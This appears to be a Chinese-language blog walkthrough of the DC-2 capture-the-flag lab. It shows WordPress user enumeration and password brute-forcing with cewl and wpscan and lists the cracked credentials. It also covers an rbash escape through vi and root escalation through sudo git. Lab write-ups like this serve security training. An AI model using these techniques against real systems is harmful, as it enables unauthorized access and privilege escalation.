---
layout: post
title: DC-2
subtitle: DC-2
date: 2023-07-08 09:27
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - DC系列
published: true
number headings: first-level 2, max 4, 1.1., auto
---

主机发现

![Pasted%20image%2020250708092821.png300](https://img.ghostliner.top/JuHdN2.png)

发现`192.168.163.131`，端口扫描
![Pasted%20image%2020250708092929.png300](https://img.ghostliner.top/siB1ce.png)

访问 80 端口，被重定向到 <http://DC-2> ，修改 hosts 即可访问

目录扫描，发现 wp-admin 后台登陆路径

访问站点，获取到 flag1，按提示使用 cewl
![Pasted%20image%2020250708093111.png300](https://img.ghostliner.top/8nOtgC.png)

```shell
cewl http://dc-2/wp-login.php -w pass.txt
wpscan --url http://dc-2/ -e u
# admin jerry tom
echo -e "admin\njerry\ntom" > user.txt
wpscan --url http://DC-2 -e -U user.txt -P pass.txt
# Username: jerry, Password: adipiscing
# Username: tom, Password: parturient
```

![Pasted%20image%2020250708100011.png300](https://img.ghostliner.top/6uYNfN.png)

![Pasted%20image%2020250708095958.png300](https://img.ghostliner.top/1iq7uw.png)

```shell
ssh tom@DC-2 -p 7744
compgen -c
vi flag3.txt
```

获取 flag3

![Pasted%20image%2020250708100605.png300](https://img.ghostliner.top/fAT1Xa.png)

rbash 提权

```shell
vi flag3.php
:set shell=/bin/sh
:shell
```

进入 sh

```shell
export PATH=$PATH:/bin
su jerry
# 输入密码
```

获取 flag4

![image.png300](https://img.ghostliner.top/g9FLWN.png)

```shell
sudo -l
# 显示：(root) NOPASSWD: /usr/bin/git
sudo git help config
!/bin/bash
```

提权到 root 用户，获取 flag5

![image.png300](https://img.ghostliner.top/7JcS8d.png)
